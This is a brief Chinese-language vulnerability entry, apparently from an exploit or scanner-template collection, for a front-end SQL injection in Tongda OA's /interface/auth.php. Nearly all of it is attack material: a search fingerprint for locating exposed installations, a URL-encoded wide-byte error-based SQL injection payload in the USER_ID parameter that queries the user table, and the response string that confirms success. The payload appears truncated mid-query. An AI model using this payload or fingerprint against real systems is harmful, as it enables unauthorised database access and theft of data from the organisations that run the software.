# 通达OAinterface前台SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`title="office Anywhere"`
- **请求**：`GET /interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20`
- **响应特征**：200 3b712de481375